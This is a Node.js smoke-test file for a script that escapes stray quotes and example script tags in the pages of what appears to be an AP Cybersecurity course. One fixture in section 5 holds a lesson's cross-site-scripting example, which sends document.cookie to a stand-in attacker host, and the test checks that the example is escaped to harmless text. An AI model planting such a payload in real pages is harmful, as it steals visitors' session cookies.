'use strict';
// ─────────────────────────────────────────────────────────────────────────────
//  SMOKE: a quote embedded inside a JS string literal is content, not a
//  delimiter, and escaping it must move nothing else on the page.
//
//  Zero PII: public page markup only. No em-dashes, per repo convention.
//  Run: node smoke/cyber-quote-escape.js
// ─────────────────────────────────────────────────────────────────────────────
const vm = require('vm');
const m = require('../scripts/cyber-quote-escape-pages');
const sf = require('../lib/storefront-fetch');

let pass = 0, fail = 0;
function ok(c, label, d) {
  if (c) { pass++; console.log('  [PASS] ' + label); }
  else { fail++; console.log('  [FAIL] ' + label + (d ? '\n         ' + d : '')); }
}
function parses(src) { try { new vm.Script(src); return true; } catch (e) { return false; } }

console.log('\n1. the escaper: a quote is stray unless closing there leaves valid structure');
const CSP_LIKE = 'var X=[{"options": ["(evType = "workshop") AND (cost <= 25)", "(evType = "workshop") AND (cost < 25)"], "answer": 0}];';
ok(!parses(CSP_LIKE), '1.1 fixture reproduces board 174: unescaped quote breaks the block');
const r1 = m.escapeStrayQuotes(CSP_LIKE);
ok(parses(r1.out), '1.2 after the escape, the block parses', r1.out);
ok(r1.escapedCount === 4, '1.3 four stray quotes found (two pairs, one per option)', String(r1.escapedCount));

const LESSON_LIKE = 'var ANS={w5q2:"A"};var EX={w5q2:"CED principle: "Companies should build products." This means responsibility."};';
ok(!parses(LESSON_LIKE), '1.4 fixture reproduces the var EX shape: unescaped quote breaks it');
const r2 = m.escapeStrayQuotes(LESSON_LIKE);
ok(parses(r2.out), '1.5 after the escape, var ANS/EX parses');

console.log('\n2. what the escaper must NOT touch');
const SAFE_SELECTOR = 'var s=document.querySelectorAll(\'input[name=\\"opt-\'+qid+\'\\"]:checked\');';
ok(m.escapeStrayQuotes(SAFE_SELECTOR).out === SAFE_SELECTOR,
  '2.1 an already-escaped quote inside a SINGLE-quoted string is left alone, not reread as a new string');
const SAFE_PLAIN = 'var ANS={w5q1:"B",w5q2:"A"};';
ok(m.escapeStrayQuotes(SAFE_PLAIN).out === SAFE_PLAIN, '2.2 a plain answer key round-trips as a no-op');
const SAFE_APOS = 'var EX={a:"Sender\'s public key and Alice\'s own keys"};';
ok(m.escapeStrayQuotes(SAFE_APOS).out === SAFE_APOS, '2.3 apostrophes inside a double-quoted string are not quotes');
const SAFE_CODE = 'var EX={a:"The flag <code>-encrypt</code> means encryption"};';
ok(m.escapeStrayQuotes(SAFE_CODE).out === SAFE_CODE, '2.4 HTML tags with no embedded quote are untouched');

console.log('\n3. the byte-level proof: nothing outside the escape moved');
const proof = m.onlyQuotesChanged(CSP_LIKE, r1.out);
ok(proof.ok && proof.escaped === 4, '3.1 the escaped and original strings differ ONLY at `"` -> `\\"`');
const corrupted = r1.out.replace('workshop', 'WORKSHOP');
ok(!m.onlyQuotesChanged(CSP_LIKE, corrupted).ok,
  '3.2 the same proof REJECTS a body where something else also changed');

console.log('\n4. repairQuotesOnly on a full <script> block');
const PAGE_LIKE = '<p>x</p><script>' + LESSON_LIKE + '</script>';
const rq = m.repairQuotesOnly('fixture', PAGE_LIKE, 'var ANS');
ok(!rq.problems, '4.1 a page with one stray-quote block is repaired', JSON.stringify(rq.problems));
ok(rq.after && rq.after.startsWith('<p>x</p><script>'), '4.2 everything outside the <script> is untouched');
ok(rq.after && parses(rq.after.slice('<p>x</p><script>'.length, -('</script>'.length))),
  '4.3 the extracted, repaired script now parses');

console.log('\n5. lesson-5: both defects, one page, order does not matter');
const SCOPED = '<code><script>fetch("evil.io/c="+document.cookie)</script></code>';
const LESSON5_LIKE = '<div>' + SCOPED + '</div><script>' + LESSON_LIKE + '</script>';
const r5 = m.repairLesson5('ap-cyber-unit-5-lesson-5', LESSON5_LIKE);
ok(!r5.problems, '5.1 both the scoped tag and the stray quote are fixed together', JSON.stringify(r5.problems));
ok(r5.after && r5.after.includes('&lt;script&gt;'), '5.2 the example tag is escaped to entities');
ok(typeof r5.after === 'string' && r5.after.length > 0, '5.3 sanity: the fixed body is a non-empty string');
const r5elements = r5.after ? require('../scripts/cyber-xss-example-escape').elements(r5.after) : [];
ok(r5elements.every((e) => !e.unparseable), '5.4 every script element in the final body parses');

console.log('\n6. a Cloudflare-rewritten body must never reach the escaper for lesson-5');
const CF_BODY = LESSON5_LIKE + '<a class="__cf_email__" data-cfemail="ab">[email protected]</a>';
const rcf = m.repairLesson5('ap-cyber-unit-5-lesson-5', CF_BODY);
ok(rcf.problems && /Cloudflare/.test(rcf.problems.join(' ')),
  '6.1 lesson-5\'s combined repair refuses a Cloudflare-rewritten body before touching it',
  JSON.stringify(rcf.problems));
ok(typeof sf.pageBody === 'function', '6.2 lib/storefront-fetch exports pageBody, the route that avoids the rewrite');

console.log('\n7. the sheet');
const csv = m.sheet([{ handle: 'h', body: rq.after }]);
ok(csv.charCodeAt(0) === 0xFEFF, '7.1 UTF-8 BOM');
ok(csv.split('\r\n').length === 3, '7.2 CRLF between records');
ok(!/Published At/i.test(csv), '7.3 no Published At column');
ok(csv.includes('"MERGE"'), '7.4 MERGE');
ok(csv.slice(1).split('\r\n')[0] === '"Handle","Command","Body HTML"',
  '7.5 exact header shape matches the house convention (BOM sliced off first, proven present in 7.1)');

console.log('\n8. a block with an UNRELATED second defect is held, not shipped half-fixed');
const SECOND_DEFECT = '<script>var ANS={x:"D"};var EX={x:"has "quoted" text"} extra garbage here;</script>';
const r8 = m.repairQuotesOnly('fixture2', SECOND_DEFECT, 'var ANS');
ok(!!(r8.problems && r8.problems.length), '8.1 the quote is fixed but the block is still held for its own separate fault',
  JSON.stringify(r8));
ok(r8.problems && /still does not parse/.test(r8.problems[0]), '8.2 the hold names WHY, not just that it failed');

console.log('\n' + pass + ' passed, ' + fail + ' failed');
process.exit(fail ? 1 : 0);
